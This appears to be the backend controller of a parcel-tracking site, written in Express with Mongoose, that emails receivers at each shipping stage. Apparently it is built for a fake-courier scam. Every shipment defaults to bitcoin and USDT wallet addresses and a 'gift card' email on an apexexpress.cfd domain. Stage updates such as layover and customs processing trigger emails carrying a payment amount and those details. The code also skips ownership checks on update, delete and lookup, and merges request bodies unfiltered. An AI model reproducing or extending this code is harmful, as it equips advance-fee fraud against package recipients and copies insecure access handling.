// controllers/shipmentController.js
const Shipment = require('../models/shipmentModel');
const { sendShipmentEmail, sendStatusUpdateEmail } = require('../utils/email');

exports.createShipment = async (req, res, next) => {
  try {
    // Initialize default status structure
    const shipmentData = {
      ...req.body,
      createdBy: req.user.id,
      status: {
        inTransit: { status: 'pending' },
        layover: { status: 'pending' },
        landedAtAirport: { status: 'pending' },
        customsProcessing: { status: 'pending' },
        delivered: { status: 'pending' }
      },
      location: {
        interactionLocation: '',
        layoverLocation: '',
        landedAtAirportLocation: '',
        customProcessingLocation: ''
      },
      paymentDetails: {
        amount: 'Pending',
        btcAddress: '1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa',
        usdtAddress: 'T9yD14Nj9j7xAB4dbGeiX9h8unkKHxuWwb',
        giftCardDetails: 'support@apexexpress.cfd'
      }
    };

    const shipment = await Shipment.create(shipmentData);

    // Send email to receiver
    const emailSent = await sendShipmentEmail(
      shipment.receiverEmail,
      shipment.trackingId,
      shipment.senderName,
      shipment.receiverName
    );

    if (!emailSent) {
      return res.status(500).json({ message: 'Shipment created but failed to send email' });
    }

    // Return plain object to avoid Mongoose document issues
    const shipmentPlain = shipment.toObject();

    res.status(201).json({
      message: 'Shipment created successfully',
      shipment: shipmentPlain
    });
  } catch (error) {
    console.error('Create shipment error:', error);
    next(error);
  }
};

// controllers/shipmentController.js
exports.updateShipment = async (req, res, next) => {
  try {
    
    const shipment = await Shipment.findById(req.params.id);
    if (!shipment) {
      return res.status(404).json({ message: 'Shipment not found' });
    }


    const originalStatus = JSON.parse(JSON.stringify(shipment.status)); // Deep copy
    
    // Ensure timestamps are set for completed statuses
    if (req.body.status) {
      Object.keys(req.body.status).forEach(key => {
        if (req.body.status[key]?.status === 'complete') {
          if (!req.body.status[key].timestamp) {
            req.body.status[key].timestamp = new Date().toISOString();
            console.log(`⏰ Added timestamp for ${key}: ${req.body.status[key].timestamp}`);
          }
        }
      });
    }
    
    // Merge the update
    Object.assign(shipment, req.body);
    const updatedShipment = await shipment.save();

    const statusKeys = ['inTransit', 'layover', 'landedAtAirport', 'customsProcessing', 'delivered'];
    const emailResults = [];
    
    for (const key of statusKeys) {
      const currentStatus = updatedShipment.status[key]?.status || 'pending';
      const originalStatusValue = originalStatus[key]?.status || 'pending';
      const paymentAmount = updatedShipment.status[key]?.paymentAmount || 'Pending';


      // Check if status changed to complete
      if (currentStatus === 'complete' && originalStatusValue !== 'complete') {
        
        const shipmentDataForEmail = {
          ...updatedShipment.toObject(),
          paymentDetails: updatedShipment.paymentDetails || {
            btcAddress: '1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa',
            usdtAddress: 'T9yD14Nj9j7xAB4dbGeiX9h8unkKHxuWwb',
            giftCardDetails: 'support@apexexpress.cfd'
          }
        };

        // Send email with better error handling
        try {
          const emailSent = await sendStatusUpdateEmail(
            updatedShipment.receiverEmail,
            updatedShipment.trackingId,
            updatedShipment.receiverName,
            key,
            paymentAmount,
            shipmentDataForEmail
          );
          
          emailResults.push({ status: key, sent: emailSent, timestamp: new Date().toISOString() });
          
        } catch (emailError) {
          console.error(`💥 [${key}] Email exception:`, emailError);
          emailResults.push({ status: key, sent: false, error: emailError.message });
        }
        
      } else if (currentStatus === 'complete' && originalStatusValue === 'complete') {
        console.log(`⚠️ [${key}] Already complete - no email sent`);
      } else {
        console.log(`⏳ [${key}] Not complete yet - no email sent`);
      }
    }

    const shipmentPlain = updatedShipment.toObject();


    res.status(200).json({
      message: 'Shipment updated successfully',
      shipment: shipmentPlain,
      emailResults: {
        totalTriggered: emailResults.filter(r => r.sent !== undefined).length,
        successful: emailResults.filter(r => r.sent === true).length,
        failed: emailResults.filter(r => r.sent === false).length,
        details: emailResults
      }
    });
  } catch (error) {
    console.error('💥 Update shipment error:', error);
    res.status(500).json({ 
      message: 'Update failed', 
      error: error.message,
      stack: process.env.NODE_ENV === 'development' ? error.stack : undefined
    });
  }
};

exports.deleteShipment = async (req, res, next) => {
  try {
    const shipment = await Shipment.findByIdAndDelete(req.params.id);

    if (!shipment) {
      return res.status(404).json({ message: 'Shipment not found' });
    }

    res.status(200).json({ message: 'Shipment deleted successfully' });
  } catch (error) {
    next(error);
  }
};

exports.getShipment = async (req, res, next) => {
  try {
    const shipment = await Shipment.findById(req.params.id);

    if (!shipment) {
      return res.status(404).json({ message: 'Shipment not found' });
    }

    res.status(200).json({
      message: 'Shipment fetched successfully',
      shipment,
    });
  } catch (error) {
    next(error);
  }
};

exports.getShipmentByTrackingId = async (req, res, next) => {
  try {
    const shipment = await Shipment.findOne({ trackingId: req.params.trackingId });

    if (!shipment) {
      return res.status(404).json({ message: 'Shipment not found' });
    }

    res.status(200).json({
      message: 'Shipment fetched successfully',
      shipment,
    });
  } catch (error) {
    next(error);
  }
};


exports.getAllShipments = async (req, res, next) => {
  console.log('Received request for getAllShipments');
  try {
    // Check if user is authenticated
    if (!req.user || !req.user.id) {
      return res.status(401).json({ 
        message: 'Authentication required to view shipments' 
      });
    }

    const shipments = await Shipment.find({ createdBy: req.user.id })
        .select('-__v')
        .lean()
        .populate('createdBy', 'name email');

    if (!shipments || shipments.length === 0) {
      return res.status(200).json({ 
        message: 'No shipments found',
        shipments: [] 
      });
    }
    
    res.status(200).json({
      message: 'Shipments fetched successfully',
      shipments,
    });
  } catch (error) {
    console.error('Error in getAllShipments:', error);
    next(error);
  }
};